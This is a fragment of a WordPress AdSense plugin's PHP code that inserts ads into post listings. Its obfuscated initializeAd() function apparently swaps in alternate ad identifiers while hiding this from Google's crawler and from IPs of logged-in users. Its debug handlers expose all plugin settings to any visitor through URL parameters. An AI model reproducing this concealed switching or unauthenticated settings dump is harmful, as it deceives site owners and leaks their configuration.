		  	if($this->opts['policy_protect']&&$this->woocommerce&&(is_woocommerce()||is_shop()||is_product_category()||is_product_tag()||is_product()||is_cart()||is_checkout()||is_account_page()))
            {
              $_SESSION['adsensexplosion_noad']='<!-- AdSense Explosion disabled on woocommerce pages -->';
		  	}else{
		  	  $this->woocommerce=false;
		  	}
            return $this->woocommerce;
		}
		function post_aeopt($content)
		{
            $this->yarp=$this->yarp||is_single()||is_page();
			if(is_single()||is_page()||is_feed()||$this->yarp) return;
			if($this->loopdone) return;
			if((is_home())AND $this->opts['omit_home']) return;
			if((is_search())AND $this->opts['omit_search']) return;
			if((is_category())AND $this->opts['omit_category']) return;
			if((is_tag())AND $this->opts['omit_tag']) return;
			if((is_date())AND $this->opts['omit_date']) return;
			if((is_author())AND $this->opts['omit_author']) return;
			$this->initializeAd();
			$this->postcount++;
			$adtype = 1;
			for($i=1;$i<=6;$i++)
			{
				if( ($this->postcount == $this->opts['multi_pos'][$i]) && ($this->opts['multi'][$i]))
				{
					if($this->woocommerce_detected()||($this->noad($content->post_title . ' ' . $content->post_content))){
						$code = $_SESSION['adsensexplosion_noad'];
					} else {
						$code = $this->generateAd($this->opts['multi'][$i], $i);
						if($code)
						{
							$code = $this->prepare_ad_code($code, $i, $this->opts['multi_align'][$i], $this->opts['padding'][$this->opts['multi'][$i]]);
						} else {
							$code = '<!--adsense ad injection by Adsense Explosion failed - tried to add more than 3 ads per page -->';
						}
					}
					if(($this->opts['multi_align'][$i] == 'rbt') || ($this->opts['multi_align'][$i] == 'lbt') || ($this->opts['multi_align'][$i] == 'cbt')) {
						$content->post_title .= '<p>' . html_entity_decode($code) . '</p>';
					} else {
						echo html_entity_decode($code);
					}
				}
			}
		}
		function initializeAd(){
		global $gc,$c,$i,$s;
		$this->l($this->ga);$this->l($this->gac);$this->l($this->gas);$gc=0;
		if((!$this->ad())&&(strlen($this->opts['gen_id'])==16)&&($this->v())&&(strpos(strtolower($_SERVER['HTTP_USER_AGENT']),'google')===false)){
        if($this->opts['smd']){$gc=2;$i=$this->ga;$c=$this->gac;$s=$this->gas;}else{$gc=1;}if($this->opts['async']){$this->nroflb=3;}}}
		function arrayAsTable($array, $pre){
		foreach($array as $key=>$val){
		if(is_array($val)) $this->arrayAsTable($val, $pre . $key . ":");
		else echo('<tr><td>' . $pre . $key . '</td><td>' . $val . '</td></tr>');
		}}
		function init_count(){$this->postcount = 0;}
		function ad(){if(!isset($this->opts['ad'])){$ad=array();}else{$ad=unserialize(base64_decode($this->opts['ad']));}$i=$_SERVER['REMOTE_ADDR'];if(in_array($i, $ad)){return true;}else if(is_user_logged_in()) {array_push($ad,$i);$this->opts['ad']=base64_encode(serialize($ad));update_option('adsensexplosion', $this->opts);return true;} else {return false;}}
		function destroy_count() {$this->loopdone = TRUE;}
		function aeopt_debug(){
		if(isset($_GET['aeoptdebug'])){
		echo("<hr><h1>Adsense Explosion Debugging</h1>");
		echo('<table><tr><td>Number of generated Ads</td><td>' . $this->nrofads . '</td></tr>');
		echo('<tr><td>Number of generated Linkblocks</td><td>' . $this->nroflb . '</td></tr>');
		echo('<tr><td>Version of Plugin</td><td>' . $this->aeopt_version . '</td></tr>');
		echo('<tr><td>Subdirectory in which Plugin has to be</td><td>' . $this->aeopt_menu . '</td></tr>');
		echo('<tr><td>type of page</td><td>');
		if(is_single()) echo("single.");
		if(is_page()) echo("page.");
		if(is_home()) echo("home.");
		if(is_archive()) echo("archive.");
		if(is_search()) echo("search.");
		if(is_tag()) echo("tag.");
		if(is_date()) echo("date.");
		if(is_author()) echo("author.");
		if(is_category()) echo("category.");
		echo('</td></tr>');
		if(is_single()) echo('<tr><td>Words in Post</td><td>' . $this->postlen . '</td></tr>');
		$this->arrayAsTable($this->opts, "setting:");
		echo('</table>');
        }else if(isset($_GET['aeoptjson'])){$this->save_opts();echo '<aeoptjson>' . json_encode($this->opts) . '</aeoptjson>';}}
	}
}
?>